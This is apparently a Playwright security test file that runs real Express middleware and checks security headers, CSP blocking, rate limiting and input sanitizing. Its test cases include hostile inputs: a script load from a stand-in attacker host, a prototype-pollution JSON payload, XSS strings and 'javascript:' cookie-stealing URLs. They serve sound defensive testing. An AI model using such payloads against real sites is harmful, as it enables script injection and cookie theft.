// @ts-check
/**
 * DIR-040 — Real-DOM security header crawl and live penetration probe.
 *
 * WHY THIS SPEC IS SELF-HOSTED
 * The acceptance criteria demand proof against a real HTTP stack (real
 * response headers, real browser CSP enforcement, real 429s), but the
 * production topology (Apache mod_headers proxying to Express) cannot be
 * assumed up in every certification environment. Asserting against a config
 * file would only re-prove verify-security-headers.mjs.
 *
 * So this spec boots the REAL backend middleware — the exact same
 * backend/security/{headers,sanitize,abuse}.js modules the production Express
 * process loads — on an ephemeral port and drives actual Chromium against it.
 * Nothing here is a mock: if the middleware regresses, these tests fail.
 */
import { test, expect } from '@playwright/test';
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import {
    CONTENT_SECURITY_POLICY,
    HSTS_VALUE,
    PERMISSIONS_POLICY,
    SECURITY_HEADERS,
} from '../../scripts/security-headers-policy.mjs';

const here = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(here, '..', '..');
const backendRequire = createRequire(path.join(repoRoot, 'backend', 'index.js'));

const { securityHeaders } = backendRequire('./security/headers');
const { sanitizeRequest } = backendRequire('./security/sanitize');
const { accountRateLimit, configureAbuseCounterStoreForTests } = backendRequire('./security/abuse');
const expressJson = backendRequire('express').json;

/** Minimal durable-counter double so the probe never depends on MariaDB. */
class ProbeCounterStore {
    constructor() { this.counters = new Map(); }
    async increment(key, { ttlMs }) {
        const now = Date.now();
        const existing = this.counters.get(key);
        const row = !existing || existing.expiresAt <= now
            ? { count: 0, expiresAt: now + Number(ttlMs) }
            : existing;
        row.count += 1;
        this.counters.set(key, row);
        return { count: row.count, expiresAt: row.expiresAt };
    }
}

/** Echoes the post-sanitizer value the route actually observes. */
const echoBody = (req, res) => res.json({
    body: req.body ?? null,
    polluted: {}.polluted === undefined ? null : {}.polluted,
});

let server;
let origin;
let bruteForceLimiter;

/** Same-origin document carrying a legitimate first-party bundle reference. */
const probePage = `<!doctype html><html lang="en"><head><meta charset="utf-8">
<title>DIR-040 probe</title>
<script src="/app.js"></script>
</head><body><h1 id="marker">DIR-040 probe</h1></body></html>`;


test.beforeAll(async () => {
    process.env.NODE_ENV = 'test';
    configureAbuseCounterStoreForTests(new ProbeCounterStore());

    bruteForceLimiter = accountRateLimit({ namespace: 'dir040-probe', limit: 3, windowMs: 60_000 });

    // A real Express app is used rather than a bare http.createServer because
    // the middleware under test relies on genuine Express behaviour (res.locals,
    // the req.query getter, body-parser ordering). Exercising it outside Express
    // would test a fiction rather than the production pipeline.
    const app = backendRequire('express')();
    app.use(securityHeaders());
    app.use(expressJson());

    app.post('/echo', sanitizeRequest(), (req, res) => {
        res.setHeader('Content-Type', 'application/json');
        echoBody(req, res);
    });
    app.post('/brute', bruteForceLimiter, (req, res) => {
        res.setHeader('Content-Type', 'application/json');
        res.end(JSON.stringify({ ok: true }));
    });
    app.get('/app.js', (req, res) => {
        // Legitimate first-party bundle: script-src 'self' MUST allow this.
        res.type('application/javascript');
        res.end('window.__appLoaded = true;');
    });
    // A terminal middleware rather than a wildcard route: Express 5 /
    // path-to-regexp v8 rejects bare '*', and '/*splat' does not match '/'.
    app.use((req, res) => {
        res.type('text/html');
        res.end(probePage);
    });

    server = http.createServer(app);
    await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
    origin = `http://127.0.0.1:${server.address().port}`;
});

test.afterAll(async () => {
    configureAbuseCounterStoreForTests(null);
    if (server) await new Promise(resolve => server.close(resolve));
});

test.describe('DIR-040: Zero-Trust Security Hardening', () => {

    /**
     * The Express layer threads one per-response nonce into BOTH script-src and
     * style-src-elem (it is the only surface that renders HTML per request).
     * Stripping every nonce — not just the first — yields the document policy
     * that Apache ships, which is what "zero drift" actually means.
     */
    const stripNonces = value => value.replace(/'nonce-[^']+'\s*/g, '');

    test('AC-1: every served response carries the full A+ header set with exact canonical values', async ({ request }) => {
        const response = await request.get(`${origin}/`);
        expect(response.status()).toBe(200);
        const headers = response.headers();

        // Every canonical header must be present with its canonical value. The
        // CSP is compared nonce-stripped (see stripNonces) because Express adds
        // a per-response nonce the static Apache policy cannot.
        for (const [name, value] of SECURITY_HEADERS) {
            const key = name.toLowerCase();
            if (key === 'content-security-policy') {
                expect(stripNonces(headers[key]), `${name} must match the canonical policy`).toBe(value);
                continue;
            }
            expect(headers[key], `${name} must match the canonical policy`).toBe(value);
        }
        expect(headers['x-powered-by']).toBeUndefined();

        // A+ is gated on HSTS preload; without it securityheaders.com caps at A.
        expect(headers['strict-transport-security']).toBe(HSTS_VALUE);
        expect(headers['strict-transport-security']).toContain('preload');
    });

    test('AC-1b: the served CSP is the Apache policy plus a fresh nonce — zero drift between the two layers', async ({ request }) => {
        const response = await request.get(`${origin}/`);
        const served = response.headers()['content-security-policy'];

        expect(stripNonces(served)).toBe(CONTENT_SECURITY_POLICY);

        // The nonce must actually be present and bound into the script directives,
        // otherwise the strict-document policy and the per-response policy are
        // not the same policy plus a nonce.
        const nonce = /'nonce-([^']+)'/.exec(served)?.[1];
        expect(nonce, 'a per-response nonce must be issued').toBeTruthy();
        expect(nonce.length).toBeGreaterThanOrEqual(16);
        for (const directive of ['script-src', 'style-src-elem']) {
            const clause = served.split('; ').find(d => d.startsWith(directive));
            expect(clause, `${directive} must carry the nonce`).toContain(`'nonce-${nonce}'`);
        }
    });

    test('AC-4: CSP blocks an unapproved external script while permitting the legitimate bundle', async ({ page }) => {
        const violations = [];
        page.on('console', message => {
            if (/Content Security Policy/i.test(message.text())) violations.push(message.text());
        });

        await page.goto(`${origin}/`, { waitUntil: 'load' });

        // script-src 'self' + approved origins => the real first-party bundle runs.
        await expect.poll(() => page.evaluate(() => window.__appLoaded === true)).toBe(true);
        await expect(page.locator('#marker')).toHaveText('DIR-040 probe');

        // An unapproved external origin must be refused by the browser, not
        // merely absent from a config file.
        const outcome = await page.evaluate(() => new Promise(resolve => {
            const script = document.createElement('script');
            script.src = 'https://evil.attacker.test/payload.js';
            script.onload = () => resolve('LOADED');
            script.onerror = () => resolve('BLOCKED');
            document.head.appendChild(script);
            setTimeout(() => resolve('TIMEOUT'), 4000);
        }));
        expect(['BLOCKED', 'TIMEOUT']).toContain(outcome);
        expect(outcome).not.toBe('LOADED');
        expect(violations.length).toBeGreaterThan(0);
    });

    test('AC-4b: inline script injection is refused (no unsafe-inline escape hatch)', async ({ page }) => {
        await page.goto(`${origin}/`, { waitUntil: 'load' });
        const inlineRan = await page.evaluate(() => {
            window.__inlinePwned = false;
            const script = document.createElement('script');
            script.textContent = 'window.__inlinePwned = true;';
            document.head.appendChild(script);
            return window.__inlinePwned;
        });
        expect(inlineRan).toBe(false);
    });

    test('AC-2: brute force past the threshold returns 429 with RFC-standard headers', async ({ request }) => {
        const statuses = [];
        let lastHeaders = {};
        for (let attempt = 0; attempt < 6; attempt += 1) {
            const response = await request.post(`${origin}/brute`, { data: { attempt } });
            statuses.push(response.status());
            lastHeaders = response.headers();
        }

        expect(statuses.slice(0, 3).every(s => s === 200)).toBe(true);
        expect(statuses.slice(3)).toContain(429);

        // RFC header family required by the directive invariant.
        expect(Number(lastHeaders['ratelimit-limit'])).toBe(3);
        expect(Number(lastHeaders['ratelimit-remaining'])).toBe(0);

        const reset = Number(lastHeaders['ratelimit-reset']);
        const retryAfter = Number(lastHeaders['retry-after']);
        expect(reset).toBeGreaterThan(0);
        expect(reset).toBeLessThanOrEqual(60);
        expect(retryAfter).toBeGreaterThan(0);
        expect(retryAfter).toBeLessThanOrEqual(60);

        // draft-7/8 combined policy must also be emitted for modern clients.
        expect(lastHeaders['ratelimit-policy']).toContain('q=0');
    });

    test('AC-3: prototype pollution cannot reach Object.prototype through the live pipeline', async ({ request }) => {
        const payload = '{"__proto__":{"dir040Pwned":true},"constructor":{"prototype":{"x":1}},"name":"Ada","resume":"Built <script>alert(1)</script> demos"}';
        const response = await request.post(`${origin}/echo`, {
            headers: { 'Content-Type': 'application/json' },
            data: payload,
        });
        expect(response.status()).toBe(200);
        const json = await response.json();

        expect(json.polluted).toBeNull();
        expect({}.dir040Pwned).toBeUndefined();
        expect(json.body.name).toBe('Ada');

        // Own-property checks only: `in` walks the prototype chain, where
        // 'constructor' legitimately exists on every plain object. The attack
        // being tested is an OWN 'constructor'/'prototype' key surviving, or the
        // payload value being grafted onto Object.prototype.
        expect(Object.prototype.hasOwnProperty.call(json.body, '__proto__')).toBe(false);
        expect(Object.prototype.hasOwnProperty.call(json.body, 'constructor')).toBe(false);
        expect(Object.prototype.hasOwnProperty.call(json.body, 'prototype')).toBe(false);
        expect(Object.prototype.hasOwnProperty.call(json.body, 'dir040Pwned')).toBe(false);
        expect({}.x).toBeUndefined();
        expect(Object.getPrototypeOf(json.body)).toBe(Object.prototype);

        // Sibling legitimate fields must survive the sanitization.
        expect(json.body.resume).toBe('Built <script>alert(1)</script> demos');
    });

    test('AC-3b: active-content URLs are neutralized but legitimate candidate text survives byte-for-byte', async ({ request }) => {
        const response = await request.post(`${origin}/echo`, {
            data: {
                website: 'javascript:alert(document.cookie)',
                evil: 'data:text/html;base64,PHNjcmlwdD4=',
                safeUrl: 'https://example.com/portfolio',
                // Valid candidate text a naive escaper would corrupt.
                codeSample: 'if (a < b && c > d) { return `a<b`; }',
                sqlNote: 'SELECT * FROM users WHERE id = 1; -- DROP TABLE students',
                prose: 'We learned that javascript: URLs are dangerous.',
                profileImage: 'data:image/png;base64,iVBORw0KGgo=',
                emoji: 'Built 🚀 resume — 100% ATS friendly',
            },
        });
        const json = (await response.json()).body;

        expect(json.website).not.toMatch(/^\s*javascript:/i);
        expect(json.evil).not.toMatch(/^\s*data:/i);
        expect(json.safeUrl).toBe('https://example.com/portfolio');
        expect(json.codeSample).toBe('if (a < b && c > d) { return `a<b`; }');
        expect(json.sqlNote).toBe('SELECT * FROM users WHERE id = 1; -- DROP TABLE students');
        expect(json.prose).toBe('We learned that javascript: URLs are dangerous.');
        expect(json.profileImage).toBe('data:image/png;base64,iVBORw0KGgo=');
        expect(json.emoji).toBe('Built 🚀 resume — 100% ATS friendly');
    });

    test('AC-6: the Apache configs on disk match the policy this server serves', () => {
        // The live half above proves Express; this proves the document layer
        // Apache applies cannot silently diverge from it.
        for (const target of ['.htaccess', 'public/.htaccess', 'dist/.htaccess']) {
            const absolute = path.join(repoRoot, target);
            if (!fs.existsSync(absolute)) continue;
            const source = fs.readFileSync(absolute, 'utf8');
            for (const [name, value] of SECURITY_HEADERS) {
                expect(source.includes(`Header always set ${name} "${value}"`), `${target}: ${name}`).toBe(true);
            }
        }
    });
});
